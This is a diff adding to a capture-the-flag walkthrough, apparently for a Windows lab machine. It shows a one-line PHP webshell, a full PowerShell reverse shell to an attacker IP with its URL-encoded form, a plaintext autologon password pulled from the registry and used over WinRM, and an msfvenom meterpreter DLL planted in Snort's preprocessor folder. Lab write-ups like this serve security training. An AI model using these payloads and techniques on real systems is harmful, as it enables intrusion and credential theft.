@@ -451,19 +451,213 @@ After logging into the portal, we notice that we can upload files to it via the 
 We can open a listener, upload a PHP reverse shell generated via [revshells](https://www.revshells.com/), and then visit the appropriate directory (which should be the `dashboard/uploads/<revshell>` that we found earlier):
 
 ```bash
+# webshell's contents
+$ cat revshell.php
+<?php system($_GET['c']); ?>
+
 # opening a listener to catch the shell
 $ nc -lnvp 1337
 listening on [any] 1337 ...
 ```
 
-![](php_revshell.png)
+![](svc_web_shell.png)
+
+Now, we can create a PowerShell-based reverse shell, URL-encode it, and pass it as a command:
+
+```bash
+# our reverse PowerShell
+$ cat revps
+powershell -ep bypass -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.16',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close();"
+```
+
+Next, we can **URL-encode** our shell via [CyberChef](https://gchq.github.io/CyberChef):
+
+![](cyberchef.png)
+
+```bash 
+# URL-encoded payload
+powershell%20%2Dep%20bypass%20%2Dnop%20%2Dc%20%22%24client%20%3D%20New%2DObject%20System%2ENet%2ESockets%2ETCPClient%28%2710%2E10%2E14%2E16%27%2C1337%29%3B%24stream%20%3D%20%24client%2EGetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200%2E%2E65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream%2ERead%28%24bytes%2C%200%2C%20%24bytes%2ELength%29%29%20%2Dne%200%29%7B%24data%20%3D%20%28New%2DObject%20%2DTypeName%20System%2EText%2EASCIIEncoding%29%2EGetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out%2DString%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29%2EPath%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext%2Eencoding%5D%3A%3AASCII%29%2EGetBytes%28%24sendback2%29%3B%24stream%2EWrite%28%24sendbyte%2C0%2C%24sendbyte%2ELength%29%3B%24stream%2EFlush%28%29%3B%7D%24client%2EClose%28%29%3B%22
+```
+
+We are now ready to pass it as a command to our webshell:
+
+
 
 ```bash
 # opening a listener to catch the shell
-$ nc -lnvp 1337
+$ sudo nc -lnvp 1337
 listening on [any] 1337 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.11.250] 53288
 whoami
 analysis\svc_web
+PS C:\inetpub\internal\dashboard\uploads>
 ```
 
 ## Lateral movement
+
+Upon exploring the target, there are some things to note down:
+
+```powershell
+PS C:\inetpub\internal\dashboard\uploads> dir c:\
+
+
+    R?pertoire?: C:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       12/06/2023     10:01                inetpub
+d-----       05/11/2022     20:14                PerfLogs
+d-----       08/05/2023     10:20                PHP
+d-----       23/01/2024     22:13                private
+d-r---       18/11/2023     09:56                Program Files
+d-----       08/05/2023     10:11                Program Files (x86)
+d-----       09/07/2023     10:57                Snort
+d-r---       26/05/2023     14:20                Users
+d-----       24/01/2024     01:15                Windows
+-a----       24/01/2024     08:08         363136 snortlog.txt
+
+PS C:\inetpub\internal\dashboard\uploads> dir c:\users
+
+
+    R?pertoire?: C:\users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       10/01/2024     10:33                Administrateur
+d-----       05/01/2024     21:29                jdoe
+d-r---       07/05/2023     21:44                Public
+d-----       26/05/2023     11:02                soc_analyst
+d-----       26/05/2023     14:20                webservice
+d-----       23/05/2023     10:10                wsmith
+```
+
+1. [**Snort**](https://www.crowdstrike.com/cybersecurity-101/threat-intelligence/snort-rules/) is used on the target:
+
+	_**Snort** is an open-source network **intrusion detection and prevention system (IDS/IPS)** that monitors network traffic and identifies potentially malicious activities on Internet Protocol (IP) networks.
+
+2. There are multiple users: `Administrateur`, `jdoe`, `soc_analyst`, `wsmith`, and `webservice`, and we have access to none of them.
+
+After searching different directories and files, we find this:
+
+```powershell
+PS C:\inetpub\internal\dashboard\uploads> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
+<SNIP>
+    DefaultPassword    REG_SZ    7y4Z4^*y9Zzj
+    AutoLogonSID    REG_SZ    S-1-5-21-916175351-3772503854-3498620144-1103
+    LastUsedUsername    REG_SZ    jdoe
+<SNIP>
+```
+
+It seems that we have found some credentials: `jdoe:7y4Z4^*y9Zzj`! We can try logging in via WinRM:
+
+```bash
+$ evil-winrm -i 10.10.11.250 -u jdoe -p 7y4Z4^*y9Zzj
+
+<SNIP>
+
+*Evil-WinRM* PS C:\Users\jdoe\Documents> ls ..\Desktop
+
+    Directory: C:\Users\jdoe\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        1/23/2024  10:11 PM             34 user.txt
+
+*Evil-WinRM* PS C:\Users\jdoe\Documents> type ..\Desktop\user.txt
+8848e4efa24ce8385d44f262ba31cba6
+```
+
+As we noticed earlier, **Snort** is used on this machine.
+
+> How to check snort's version?
+
+[CVE-2016-1417](https://nvd.nist.gov/vuln/detail/CVE-2016-1417)
+
+
+```bash
+# creating a malicious DLL
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp -f dll LHOST=10.10.14.16 LPORT=9999 > sf_engine.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of dll file: 9216 bytes
+
+# starting a Python HTTP server
+$ python3 -m http.server 8888
+Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
+```
+
+```powershell
+# download the malicious DLL
+*Evil-WinRM* PS C:\Users\jdoe\Documents> cd C:\snort\lib\snort_dynamicpreprocessor
+*Evil-WinRM* PS C:\snort\lib\snort_dynamicpreprocessor> wget http://10.10.14.16:8888/sf_engine.dll
+
+StatusCode        : 200
+StatusDescription : OK
+Content           : {77, 90, 144, 0...}
+RawContent        : HTTP/1.0 200 OK
+                    Content-Length: 9216
+                    Content-Type: application/x-msdos-program
+                    Date: Wed, 24 Jan 2024 07:31:59 GMT
+                    Last-Modified: Wed, 24 Jan 2024 07:25:00 GMT
+                    Server: SimpleHTTP/0.6 Python/3.11....
+Headers           : {[Content-Length, 9216], [Content-Type, application/x-msdos-program], [Date, Wed, 24 Jan 2024 07:31:59 GMT], [Last-Modified, Wed, 24 Jan 2024 07:25:00 GMT]...}
+RawContentLength  : 9216
+
+# confirm the file was downloaded
+*Evil-WinRM* PS C:\snort\lib\snort_dynamicpreprocessor> ls
+
+    Directory: C:\snort\lib\snort_dynamicpreprocessor
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+<SNIP>
+-a----        1/23/2024  10:13 PM           9216 sf_engine.dll
+<SNIP>
+
+# create an empty .pcap file
+*Evil-WinRM* PS C:\snort\lib\snort_dynamicpreprocessor> New-Item -Path "C:\snort\lib\snort_dynamicpreprocessor\emptyFile.pcap" -ItemType File
+
+    Directory: C:\snort\lib\snort_dynamicpreprocessor
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        1/24/2024   8:33 AM              0 emptyFile.pcap
+```
+
+Finally, we can launch our meterpreter and wait to catch our shell:
+
+```bash
+msf6 exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     tun0             yes       The listen address (an interface may be specified)
+   LPORT     9999             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.14.16:9999
+```
